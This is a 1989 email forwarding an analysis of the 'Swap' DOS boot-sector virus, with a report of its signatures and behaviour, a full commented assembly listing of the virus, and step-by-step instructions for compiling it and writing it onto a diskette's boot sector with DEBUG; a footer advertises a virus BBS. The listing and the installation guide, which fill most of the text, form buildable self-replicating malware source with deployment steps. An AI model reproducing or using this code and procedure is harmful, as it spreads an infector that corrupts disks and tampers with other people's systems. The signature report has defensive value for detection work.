From:	Jnet%"NYYUVAL@WEIZMANN"      "Yuval Tal -8-474592" 15-AUG-1989 19:42:53.22
To:	RCSTRN@HEITUE51
CC:	
Subj:	Swap Virus

Received: From WEIZMANN(VMMAIL) by HEITUE51 with Jnet id 6788
          for RCSTRN@HEITUE51; Tue, 15 Aug 89 19:42 N
Received: by WEIZMANN (Mailer R2.03B) id 7639; Tue, 15 Aug 89 20:34:55 +0300
Date:         Tue, 15 Aug 89 20:33:34 +0300
From:         "Yuval Tal (972)-8-474592" <NYYUVAL@WEIZMANN>
Subject:      Swap Virus
To:           RCSTRN@HEITUE51
 
hi....
 
This is the swap virus that i've told u about..
 
cheers,
 
       yuval
        +------------------------------------------------------+
        |                The "Swapping" virus                  |
        +------------------------------------------------------+
        |                                                      |
        | Disassembled on: August, 1989                        |
        |                                                      |
        | Disassembled by: Yuval Tal                           |
        |                                                      |
        | Disassembled using: ASMGEN and DEBUG                 |
        |                                                      |
        +------------------------------------------------------+
 
Important note: If you find *ANYTHING* that you think I wrote
incorrectly or is-understood something, please let me know ASAP.
You can reach me:
 
 Bitnet:   NYYUVAL@WEIZMANN
 InterNet: NYYUVAL%WEIZMANN.BITNET@CUNYVM.CUNY.EDU
 
 
This text is divided into theree parts:
 
    1) A report about the Swap Virus.
    2) A disassembly of the Swap Virus.
    3) How to install this virus?
 
-------------------------------------------------------------------------------
                            R  E  P  O  R  T
-------------------------------------------------------------------------------
 
Virus Name..............: The Swap Virus
Attacks.................: Floppy-disks only
Virus Detection when....: June, 1989
                at......: Israel
Length of virus.........: 1. The virus itself is 740 bytes.
                          2. 2048 bytes in RAM.
Operating system(s).....: PC/MS DOS version 2.0 or later
Identifications.........: A) Boot-sector:
                             1) Bytes from $16A in the boot sector are:
                                   31 C0 CD 13 B8 02 02 B9 06 27 BA 00 01 CD 13
                                   9A 00 01 00 20 E9 XX XX
                             2) The first three bytes in the boot sector are:
                                JMP 0196 (This is, if the boot sector was
                                          loaded to CS:0).
                          B) FAT: Track 39 sectors 6-7 are marked as bad.
                          C) The message:
                                "The Swapping-Virus. (C) June, by the CIA"
                             is located in bytes 02B5-02E4 on track 39,
                             sector 7.
Type of infection.......: Stays in RAM, hooks int $8 and int $13.
                          A diskette is infected when it is inserted into the
                          drive and ANY command that reads or writes from/to
                          the diskette is executed. Hard disks are NOT infected!
Infection trigger.......: The virus starts to work after 10 minutes.
Interrupt hooked........: $8 (Timer-Tick - Responsible for the letter dropping)
                          $13 (Disk Drive - Infects!)
Damage..................: Track 39 sectors 6-7 will be marked as bad in the
                          FAT.
Damage trigger..........: The damage is done whenever a diskette is infected.
Particularities.........: A diskette will be infected only if track 39 sectors
                          6-7 are empty.
 
 
-------------------------------------------------------------------------------
                      D  I  S  A  S  S  E  M  B  L  Y
-------------------------------------------------------------------------------
 
;The first thing I did, inorder to dis-assemble this virus, was un-assemling
;it with the U command in DOS's DEBUG utility. Then, I used a dis-assembler
;called ASMGEN to set all the labels and variables in the .ASM file. I then
;compared the two outputs (from DEBUG and from ASMGEN) and updated the .ASM
;file that no command will be missing, added a few things and this is the
;result:
 
CODE    SEGMENT
 
        ASSUME DS:CODE,CS:CODE
        ORG    0000H
 
START:  JMP     L0353
 
        DATA_BEGIN   EQU  THIS BYTE
 
        OldInt8      DW   0,0             ;The old interrupt 8: Offset Segment
        OldInt13     DW   0,0             ;The old interrupt 13: Offset Segment
        RandomNumber DW   0               ;The random number
        Flag         DB   0
        Counter      DW   0
        Counter2     DW   0
        Status       DB   0
        CHAR         DB   0               ;The character that is falling
        CHARUNDER    DB   0               ;The chacterer that we save
        ADDRCHAR     DW   0               ;The address of the character in mem.
        GOT13        DB   0               ;If interrupt 13 is installed
        DISKDRIV     DB   0               ;The diskette that we are infecting
        DISK         DW   0               ;The diskette that we are infecting
 
 
        DATA_END     EQU   THIS BYTE
 
; The following 11 command are written into the boot-sector at address CS:196
; At first I worte the commands, but some of the opcodes weren't the same as
; in the virus so I've exchanged them into opcodes for maximum compability.
 
 
        StartCmds     EQU  THIS BYTE
 
        DB 031h,0C0h                        ;XOR     AX,AX
        DB 0CDh,013h                        ;INT     13h
        DB 0B8h,002h,002h                   ;MOV     AX,OFFSET 0202h
        DB 0B9h,006h,027h                   ;MOV     CX,OFFSET 2706h
        DB 0BAh,000h,001h                   ;MOV     DX,OFFSET 0100h
        DB 0BBh,000h,020h                   ;MOV     BX,OFFSET 2000h
        DB 08Eh,0C3h                        ;MOV     ES,BX
        DB 0BBh,000h,000h                   ;MOV     BX,0
        DB 0CDh,013h                        ;INT     13h
        DB 09Ah,00h,00h,00h,020h            ;Call 2000h:0000
        DB 0E9h                             ;JMP
FirstJMP DW 0FE89h                          ;    003EH    (Don't worry,
                                            ;              it's the right addres
 
 
;------------------------------------------
; This is the new interrupt $13 routine
;------------------------------------------
 
NewInt13:
        PUSHF                                   ;
        CMP     DL,1h                           ;Call for drive A: or B:?
        JA      L0153                           ;If not, don't put virus
 
        CMP     AH,2h                           ;Is it a readblock function
        JB      L0153                           ;(AH=2)? No, AH is smaller so
                                                ;don't put virus
 
        CMP     AH,3h                           ;Is it a writeblock function
        JA      L0153                           ;(AH=3)? No, AH is bigger so
                                                ;don't put virus
        INC     DL                              ;Set disk drive to fit the user
                                                ;(Drive A=1 ; Drive B=2)
        MOV     CS:DiskDriv,DL                  ;Save the drive number
        DEC     DL                              ;Set disk drive to fit the int.
                                                ;(Drive A=0 ; Drive B=1)
 
 
L0153:  CALL    DWORD PTR  CS:OldInt13          ;Call the original int 13
        JNB     L0160                           ;If no error, goto end of
                                                ;routine. (JNB=JNC)
        MOV     BYTE PTR CS:DiskDriv,0          ;If error, DiskDriv=0
 
L0160:  RETF     2                              ;Return from routine
 
;-----------------------------------------------------
; Infect the diskette
;-----------------------------------------------------
 
L0163:  PUSH    ES                              ;
        PUSH    BP                              ;Save registers
        MOV     BP,SP                           ;
        MOV     AX,[BP+10h]                     ;Let AX=CS from the stack
 
        POP     BP                              ;
 
        CMP     AX,0200h                        ;Are we called from the system?
        JBE     L01BB                           ;If so, don't infect
        MOV     BX,CS                           ;Get the program segment
        CMP     AX,BX                           ;Is it the same as one from
        JNB     L01BB                           ;stack? If so, don't infect
 
        MOV     AX,CS                           ;
        MOV     ES,AX                           ;ES=CS
        MOV     AL,CS:DiskDriv                  ;AL=DiskDriv
        DEC     AL                              ;Set AL to fit int
        XOR     AH,AH                           ;AH=0
        MOV     CS:Disk,AX                      ;Save AX
        MOV     AX,0201h                        ;Read one sector
        MOV     BX,0400h                        ;to buffer CS:400
        MOV     CX,0003h                        ;from sector 3, track 0 (FAT)
        MOV     DX,CS:Disk                      ;restore the disk drive
        INT     13h                             ;Read it!!!
        JB      L01BE                           ;If error, don't infect
 
        MOV     AX,0301h                        ;Write one sector
        MOV     BX,0400h                        ;from CS:400
        MOV     DX,CS:Disk                      ;the disk drive number
        CMP     BYTE PTR CS:[BX+13h],0          ;is there something on it?
        JNZ     L01BE                           ;yes, don't infect
 
        MOV     BYTE PTR CS:[BX+13h],0F7h       ;Mark the sector before the
        OR      BYTE PTR CS:[BX+14h],0Fh        ;last one as bad
        INT     13h                             ;Re-write the FAT!
        JB      L01BE                           ;If error, don't infect!
        JMP     SHORT   L01C1                   ;Continue...
 
;Note: I have no idea what is the object of the next NOPs.
 
        NOP                                     ;
L01BB:  JMP     SHORT   L022D                   ;These JMP are for the don't
        NOP                                     ;infect...see above!
L01BE:  JMP     SHORT   L0227                   ;
        NOP                                     ;
 
L01C1:  MOV     AX,0201h                        ;Read one sector to the
        MOV     BX,0400h                        ;buffer at CS:400
        MOV     CX,0001h                        ;from sector 1, track 0 (boot
        MOV     DX,CS:Disk                      ;sector) from diskette
        INT     13h                             ;Read it!
        JB      L0227                           ;If error, don't infect
 
;A boot sector always start with a JMP to a certain place. This virus changes
;this JMP to
 
        MOV     BX,0400h                        ;Check where does the first
        MOV     AL,CS:[BX+1]                    ;JMP jumps to.
        XOR     AH,AH                           ;
        SUB     AX,1B3h                         ;Reduce 1B3h to calculate the
                                                ;real JMP address and
        MOV     CS:FirstJMP,AX                  ;save it.
 
        MOV     WORD PTR CS:[BX],93E9h          ;Change the JMP in the loaded
        MOV     BYTE PTR CS:[BX+2],1            ;boot-sector (CS:400). E9=JMP
 
        PUSH    SI                              ;
        PUSH    DI                              ;
        PUSH    DS                              ;Save registers
        MOV     AX,CS                           ;
        MOV     DS,AX                           ;DS=CS
 
;Here, the commands which are added to the boot-sector at the 196th byte are
;copied to the loaded boot-sector at address CS:400.
 
        MOV     SI,Offset StartCmds             ;SI points to commands to add
                                                ;to the boot-sector
        MOV     DI,0596h                        ;The 196th byte from CS:400
        MOV     CX,1Fh                        ;The commands are 1Fh bytes long
        CLD                                     ;
        REPZ    MOVSB                           ;Copy it!
 
L0200:  POP     DS                              ;
L0201:  POP     DI                              ;
L0202:  POP     SI                              ;Restore registers
 
;The loaded and changed boot-sector is re-written to the diskette.
 
        MOV     AX,0301h                        ;Write one sector from
        MOV     BX,0400h                        ;CS:400 to
        MOV     CX,0001h                        ;sector 1, track 0
        MOV     DX,CS:Disk                      ;disk number..
        INT     13h                             ;Write data!
        JB      L0227                           ;If error, don't infect
 
;Here, the virus is written to the diskette to the marked bad sectors
 
        MOV     AX,0302h                        ;Write two sectors from
        MOV     BX,0                            ;CS:0 (this code!) to
        MOV     CX,2706h                        ;track 27h, sector 6
        MOV     DX,CS:Disk                      ;disk number..
        MOV     DH,1h                           ;side number 1
        INT     13h                             ;Write it!
 
L0227:  MOV     BYTE PTR CS:DiskDriv,0          ;In case of error DiskDriv=0
L022D:  POP     ES                              ;Restore register
        JMP     SHORT   L02AF                   ;finished infecting
        NOP                                     ;Again, i don't know what is
                                                ;this NOP object
;-------------------------------------------
; The new interrupt 13h is installed here
;-------------------------------------------
 
 
L0231:  XOR     AX,AX                           ;ES points to lowest segment
        MOV     ES,AX                           ;in memory
        MOV     BX,ES:4Ch                       ;
        MOV     CS:OldInt13[0],BX               ;Save the int vector (offset)
        MOV     BX,ES:4Eh                       ;
        MOV     CS:OldInt13[2],BX               ;Save the int vector (segment)
 
        MOV     BX,CS                           ;BX=CS
        MOV     ES:4Eh,BX                       ;Change the int vector (segment)
        MOV     BX,Offset NewInt13              ;BX=Offset of the new int 13
        MOV     ES:4Ch,BX                       ;Change the int vector (offset)
 
        MOV     BYTE PTR CS:Got13,1             ;Mark flag that int 13 is instal
        MOV     BYTE PTR CS:Status,0            ;Status=0
 
        JMP     L034D                           ;Continue....
 
;-----------------------------------------------------
 
L0267:  JMP     L0163                           ;Infect disk!
 
;-----------------------------------------------------
;This is the new interrupt $8
;-----------------------------------------------------
 
L026A:  PUSHF                                   ;
        CALL    DWORD PTR CS:OldInt8            ;Call orginal interrput
        PUSH    AX                              ;
        PUSH    BX                              ;
        PUSH    CX                              ;
        PUSH    DX                              ;
        PUSH    ES                              ;Save registers
 
;The virus picks a random number. It does it by adding AX,BX,CX and DX
;to RandomNumber. The values of AX,BX,CX and DX are undefined because an
;hardware interrupt (look6 commands back) was called.
 
        ADD     CS:RandomNumber,AX              ;\
        ADD     CS:RandomNumber,BX              ; |_ Create random number
        ADD     CS:RandomNumber,CX              ; |
        ADD     CS:RandomNumber,DX              ;/
 
;I am not sure what the programmer had done next but my guess is that this
;is the time check. The virus starts to work after 10 minuntes or so.
 
        CMP     WORD PTR CS:Counter,0443h       ;Is my counter>=443h?
        JNB     L029F                           ;Yes, it is..
 
        INC     WORD PTR CS:Counter             ;No, incerase it and also
        INC     WORD PTR CS:Counter2            ;increase another thing (??)
                                                ;and then,
        JMP     L034D                           ;goto end of routine
 
L029F:  CMP     BYTE PTR CS:Got13,0             ;
        JZ      L0231
        CMP     BYTE PTR CS:DiskDriv,0          ;Is diskette infected?
        JNZ     L0267                           ;No, infect it!
 
L02AF:  CMP     WORD PTR CS:Counter2,2A9Dh      ;??
        JNB     L02C0                           ;??
        INC     WORD PTR CS:Counter2            ;??
        JMP     L034D                           ;Exit routine
 
;-----------------------------------------------------------------
; This is the main routine which drops the letter from the screen
;-----------------------------------------------------------------
 
L02C0:  MOV     BX,0B800h                       ;Make ES point to the screen
        MOV     ES,BX                           ;segment (only cga,ega,mcga)
        CMP     BYTE PTR CS:Status,0            ;Is status=0?
        JNZ     L0305                           ;No, drop letter
 
;This is done to make space in the time between the letters fall.
 
        ADD     BYTE PTR CS:Flag,4              ;Flag:=Flag+4
        CMP     BYTE PTR CS:Flag,4              ;Is flag=4?
        JNB     L034D                           ;If so, don't drop
 
        MOV     BX,CS:RandomNumber              ;Set up random number..
        MOV     CL,5                            ;
        SHR     BX,CL                           ;first, devide it by 32
        SHL     BX,1                            ;second, multiply it by 2
 
        MOV     AL,ES:[BX]                      ;Save the char we need to drop
        CMP     AL,20h                          ;is it a space( )?
        JZ      L034D                           ;if so, don't drop
 
        MOV     CS:Char,AL                      ;Save the char
        MOV     BYTE PTR CS:CharUnder,20h       ;The saved char is now ' '
        MOV     CS:AddrChar,BX                  ;Svae the address of the char
        MOV     BYTE PTR CS:Status,1            ;Status=1
 
L0302:  JMP     SHORT   L034D                   ;Go to exit
        NOP                                     ;
 
L0305:  CMP     BYTE PTR CS:Status,2            ;Is Status=2?
        JZ      L0315                           ;If so, continue
        INC     BYTE PTR CS:Status              ;Else, status=status+1
 
        JMP     SHORT   L034D                   ;Go to exit
        NOP                                     ;
 
L0315:  MOV     BYTE PTR CS:Status,1            ;Status:=1
        MOV     BX,CS:AddrChar                  ;Put address of character in BX
        MOV     AL,CS:CharUnder                 ;and the saved char at AL
        MOV     ES:[BX],AL                      ;Erase the letter on the screen
        ADD     BX,0A0h                         ;Move pointer to next line
 
        CMP     BX,0FA0h                        ;Did we past end of screen?
        JA      L0347                           ;If so, the dropping has ended
        MOV     CS:AddrChar,BX                  ;Save the new address
        MOV     AL,ES:[BX]                      ;and the character
        MOV     CS:CharUnder,AL                 ;and put the dropping letter
        MOV     AL,CS:Char                      ;in the current location
        MOV     ES:[BX],AL                      ;
 
        JMP     SHORT   L034D                   ;Go to end of routine
        NOP                                     ;
 
L0347:  MOV     BYTE PTR CS:Status,0            ;Status:=0
                                                ;
 
L034D:  POP     ES                              ;Resotre registers
        POP     DX                              ;
        POP     CX                              ;
        POP     BX                              ;
        POP     AX                              ;
        IRET                                    ;Return from interrupt
 
;-------------------------------------------------------------------
;This part of the virus initilized the TSR
;-------------------------------------------------------------------
 
L0353:  PUSH    DS                              ;
        PUSH    ES                              ;Save registers
        MOV     AX,CS                           ;
        MOV     DS,AX                           ;Make CS=DS
 
;First thing, clear all the data area
 
        MOV     ES,AX                           ;ES=DS
        MOV     DI,OFFSET DATA_BEGIN            ;Offset of beginning of data
        MOV     CX,OFFSET DATA_END-OFFSET DATA_BEGIN ;Length of data
        CLD                                     ;Go forward
        XOR     AL,AL                           ;Store 0 each time (AL=0)
        REPZ    STOSB                           ;Repeat so CX times
 
;Now, make ES point to the lowest segment in the memory
 
        XOR     AX,AX                           ;
        MOV     ES,AX                           ;ES point to lowest segment
 
;The interrupt vectors are written in the lowest segment so:
;
; 1) Save the interrupt 8 segment and offset for later use
; 2) Read amount of memory (0:413h) and steal 2K (the virus will be put here)
 
        MOV     BX,ES:20h                       ;Get offset of int $8
        MOV     DS:OldInt8[0],BX                ;Save int $8 offset
        MOV     BX,ES:22h                       ;Get segment of int $8
        MOV     DS:OldInt8[2],BX                ;Save int $8 segment
 
        MOV     AX,ES:413h                      ;Put amount of mem. in AX,
        SUB     AX,2                            ;steal 2K and
        MOV     ES:413h,AX                      ;save the new amount of mem.
 
;Copy the virus to the highest place in the memory:
 
        MOV     CL,6                            ;
        SHL     AX,CL                           ;Multiply the mem size by 64 and
        MOV     ES,AX                           ;make ES point to this segm.
        MOV     SI,OFFSET START                 ;SI to begining of this code
        MOV     DI,SI                           ;
        MOV     CX,OFFSET _End-OFFSET Start     ;Virus length=_End-Start
        CLD                                     ;
        REPZ    MOVSB                           ;Copy the virus.
 
;IMPORTANT: I am not sure that what I am saying in the next paragraph is
;           correct. Please let me know if I am wrong
 
        XOR     AX,AX                           ;
        MOV     DS,AX                           ;DS point to lowest segment
        MOV     BX,CS:OldInt8[0]                ;Get the offset of int $8 and
        MOV     BYTE PTR ES:[BX],0CFh           ;put 0CFh there (I think it is
                                                ;to put IRET).
 
;OK, now all the virus needs to do is to change the interrupt vector so
;it will point the new $8 interrput.
 
        MOV     BX,ES                           ;
        CLI                                     ;
        MOV     DS:22h,BX                       ;Change the vector (Segment)
        MOV     BX,OFFSET L026A                 ;BX=Offset of new interrupt
        MOV     DS:20h,BX                       ;Change the vector (Offset)
        STI                                     ;
 
        POP     ES                              ;Restore registers
        POP     DS                              ;
 
        RETF                                    ;Return back
 
;I guess this is the signature of the virus:
 
   DB 'The Swapping-Virus. (C) June, 1989 by the CIA'
 
  _END     EQU    THIS BYTE
 
        CODE    ENDS
;
END     START
 
-------------------------------------------------------------------------------
  H  O  W      T  O      I  N  S  T  A  L  L      T  H  E      V  I  R  U  S
-------------------------------------------------------------------------------
 
 1) Cut the disassembly from this text.
 2) Compile the disassembly. I used Macro Assembler 5.1 in order to compile and
    link it but I think that there won't be any trouble using Turbo Assembler.
 3) Use EXE2BIN or anything else inorded to make it a .COM file.
 4) Format a diskette with the /S option inorder to put the operation system on
    it (make sure you format it in 9 sectors per track format).
 5) Enter DOS's DEBUG debugger and load the .COM file that you have created.
 6) Type: M 100 400 0    this is done inorded to move the virus from CS:100 to
    CS:0.
 7) Put the diskette you want to infect in drive A.
 8) Type: W 0 0 2CC 2    this command will write the virus into sectors 6-7 on
    track 39.
 9) Type: L 0 0 0 1      this will load the boot sector into the memory.
10) Type: U 0            and remember the number after the JMP in offset 0.
11) Type: A 0
          JMP 196      this will execute the virus each time the
    diskette is booted.
12) Type: A 196
          XOR AX,AX
          INT 13
          MOV AX,202
          MOV CX,2706
          MOV DX,100
          MOV BX,2000
          MOV ES,BX
          MOV BX,0
          INT 13
          CALL 2000:0000
          JMP <the number from CS:0>
13) Now, save the boot sector by typing: W 0 0 0 1
 
That's it! The virus is now installed on your diskette!
 
+-----------------------------------------------------------------------+
| BitNet:   NYYUVL@WEIZMANN              CSNet: NYYUVAL@WEIZMANN.BITNET |
| InterNet: NYYUVAL%WEIZMANN.BITNET@CUNYVM.CUNY.EDU                     |
|                                                                       |
| Yuval Tal                                                             |
| The Weizmann Institute Of Science     "To be of not to be" -- Hamlet  |
| Rehovot, Israel                       "Oo-bee-oo-bee-oo" -- Sinatra   |
+-----------------------------------------------------------------------+

;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;  컴컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴
;  컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴
;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
